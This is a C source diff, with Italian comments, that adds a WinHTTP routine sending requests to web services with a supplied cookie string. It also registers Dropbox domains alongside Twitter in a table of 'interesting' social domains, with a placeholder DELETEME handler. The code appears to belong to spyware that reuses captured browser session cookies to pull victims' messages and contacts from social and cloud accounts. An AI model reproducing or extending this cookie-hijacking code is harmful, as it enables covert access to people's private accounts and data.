@@ -305,6 +305,148 @@ DWORD XmlHttpSocialRequest(
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
+/* similar to HttpSocialRequest, with the possibility of appending an additional header */
+DWORD HttpSocialRequestWithAdditionalHeader(
+	__in LPWSTR strHostName, 
+	__in LPWSTR strHttpVerb, 
+	__in LPWSTR strHttpRsrc, 
+	__in DWORD dwPort, 
+	__in LPBYTE *lpSendBuff, 
+	__in DWORD dwSendBuffSize, 
+	__out LPBYTE *lpRecvBuff, 
+	__out DWORD *dwRespSize, 
+	__in LPSTR strCookies,
+	__in_opt LPWSTR strAdditionalHeader)
+{
+	WCHAR *cookies_w;
+	DWORD cookies_len;
+	DWORD dwStatusCode = 0;
+	DWORD dwTemp = sizeof(dwStatusCode);
+	DWORD n_read;
+	char *types[] = { "*\x0/\x0*\x0",0 };
+	HINTERNET hConnect, hRequest;
+	BYTE *ptr;
+	DWORD flags = 0;
+	BYTE temp_buffer[8*1024];
+
+	//make sure the buffer is initialized
+	*lpRecvBuff = NULL;
+
+	// Manda la richiesta
+	cookies_len = strlen(strCookies);
+	if (cookies_len == 0)
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+
+	cookies_len++;
+	cookies_w = (WCHAR *)zalloc(cookies_len * sizeof(WCHAR));
+	if (!cookies_w)
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+
+	_snwprintf_s(cookies_w, cookies_len, _TRUNCATE, L"%S", strCookies);		
+	if (dwPort == 443)
+		flags = WINHTTP_FLAG_SECURE;
+
+	if (!(hConnect = WinHttpConnect(gHttpSocialSession, (LPCWSTR) strHostName, (INTERNET_PORT)dwPort, 0))) 
+	{
+		zfree(cookies_w);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	if ( !(hRequest = WinHttpOpenRequest(hConnect, strHttpVerb, strHttpRsrc, NULL, WINHTTP_NO_REFERER, (LPCWSTR *) types, flags)) ) 
+	{
+		zfree(cookies_w);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	/* append additional header, if any */
+	if (strAdditionalHeader != NULL)
+	{
+		if (!WinHttpAddRequestHeaders(hRequest, strAdditionalHeader, -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) 
+		{
+			zfree(cookies_w);
+			WinHttpCloseHandle(hRequest);
+			WinHttpCloseHandle(hConnect);
+			return SOCIAL_REQUEST_NETWORK_PROBLEM;
+		}
+	}
+
+
+	if (!WinHttpAddRequestHeaders(hRequest, L"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) // FIXME array-izza la stringa
+	{
+		zfree(cookies_w);
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	if (!WinHttpAddRequestHeaders(hRequest, cookies_w, -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) 
+	{
+		zfree(cookies_w);
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, lpSendBuff, dwSendBuffSize, dwSendBuffSize, NULL))
+	{
+		zfree(cookies_w);
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+	zfree(cookies_w);
+
+	// Legge la risposta
+	if(!WinHttpReceiveResponse(hRequest, 0)) 
+	{
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE| WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwTemp, NULL ))  
+	{
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+	
+	if (dwStatusCode != HTTP_STATUS_OK) 
+	{
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_BAD_COOKIE;
+	}
+
+	*dwRespSize = 0;	
+	//spostato all'inizio della funzione perchè causava un leak in caso di errore prima di questo punto (free di questa variabile non inizializzata)
+	//*lpRecvBuff = NULL;
+	for(;;) 
+	{
+		if (!WinHttpReadData(hRequest, temp_buffer, sizeof(temp_buffer), &n_read) || n_read==0 || n_read>sizeof(temp_buffer))
+			break;
+		if (!(ptr = (BYTE *)realloc((*lpRecvBuff), (*dwRespSize) + n_read + sizeof(WCHAR))))
+			break;
+		*lpRecvBuff = ptr;
+		memcpy(((*lpRecvBuff) + (*dwRespSize)), temp_buffer, n_read);
+		*dwRespSize = (*dwRespSize) + n_read;
+		// Null-termina sempre il buffer
+		memset(((*lpRecvBuff) + (*dwRespSize)), 0, sizeof(WCHAR));
+	} 
+
+	if (!(*lpRecvBuff)) 
+	{
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	WinHttpCloseHandle(hRequest);
+	WinHttpCloseHandle(hConnect);
+	return SOCIAL_REQUEST_SUCCESS;
+}
+
 // Invia una richiesta HTTP e legge la risposta
 // Alloca il buffer con la risposta (che va poi liberato dal chiamante)
 DWORD HttpSocialRequest(
@@ -434,6 +576,11 @@ DWORD HttpSocialRequest(
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
+/* dummy for fake social handler */
+DWORD DELETEME(char *cookie)
+{
+	return 1;
+}
 
 VOID InitSocialEntries()
 {
@@ -465,6 +612,16 @@ VOID InitSocialEntries()
 		wcscpy_s(pSocialEntry[n].strDomain, TWITTER_DOMAIN);
 		pSocialEntry[n].fpRequestHandler = HandleTwitterTweets;//TwitterMessageHandler;
 		n++;
+
+		/* --- cloud domains --- */
+		wcscpy_s(pSocialEntry[n].strDomain, DROPBOX_DOMAIN);
+		pSocialEntry[n].fpRequestHandler = DELETEME;//TwitterMessageHandler;
+		n++;
+
+		wcscpy_s(pSocialEntry[n].strDomain, DROPBOX_DOMAINWWW);
+		pSocialEntry[n].fpRequestHandler = DELETEME;//TwitterMessageHandler;
+		n++;
+
 	}
 
 	if (ConfIsModuleEnabled(L"addressbook"))
@@ -491,6 +648,13 @@ VOID InitSocialEntries()
 		pSocialEntry[n].fpRequestHandler = HandleTwitterContacts; //TwitterContactHandler;
 		n++;
 
+		/* --- cloud domains --- */
+		wcscpy_s(pSocialEntry[n].strDomain, DROPBOX_DOMAIN);
+		pSocialEntry[n].fpRequestHandler = DELETEME;//TwitterMessageHandler;
+		n++;
+		wcscpy_s(pSocialEntry[n].strDomain, DROPBOX_DOMAINWWW);
+		pSocialEntry[n].fpRequestHandler = DELETEME;//TwitterMessageHandler;
+		n++;
 	}
 
 	// load timestamps
@@ -601,7 +765,7 @@ BOOL IsInterestingDomainW(LPWSTR strDomain)
 	for (DWORD i=0; i<SOCIAL_ENTRY_COUNT; i++)
 		if(!wcscmp(strDomain, pSocialEntry[i].strDomain))
 			return TRUE;
-
+	
 	// Caso particolare per cookie di mail.google.com messi sul dominio principale
 	if (!wcscmp(strDomain, L"google.com"))
 		 return TRUE;
